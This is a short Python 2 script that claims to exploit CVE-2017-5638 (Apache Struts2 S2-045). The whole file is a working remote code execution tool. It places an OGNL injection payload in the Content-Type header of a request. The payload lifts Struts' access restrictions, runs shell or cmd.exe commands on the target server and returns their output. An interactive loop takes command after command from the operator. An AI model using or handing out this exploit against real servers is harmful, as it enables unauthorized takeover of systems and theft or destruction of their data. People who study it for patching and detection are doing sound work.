#!/usr/bin/env python
# -*- coding:utf-8 -*-
# author:ray
# date:2019-4-9

import sys
import requests
import httplib

def poc(url, cmd):
	
	payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
	payload += "(#cmd='%s')." % cmd
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	try:
		header = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; r    v:49.0) Gecko/20100101 Firefox/49.0','Content-Type':payload}

		request = requests.get(url,headers=header)
		response = request.text
		return response
		 
	except httplib.IncompleteRead, e:
		response = e.partial
		print(response)


if __name__ == '__main__':

	if len(sys.argv) != 2:
	    print "Usage: python CVE-2017-5638-S2-045.py url "
	else:
	    print "----------------------------------------"
	    print "|                                      |"                 
	    print "|      CVE-2017-5638 | S2-045-RCE      |"
	    print "|                                      |"
	    print "----------------------------------------" 
	url = sys.argv[1]
	while True:
	    cmd = raw_input(">>>command: ")
    	    print poc(url, cmd)
    	



   
      


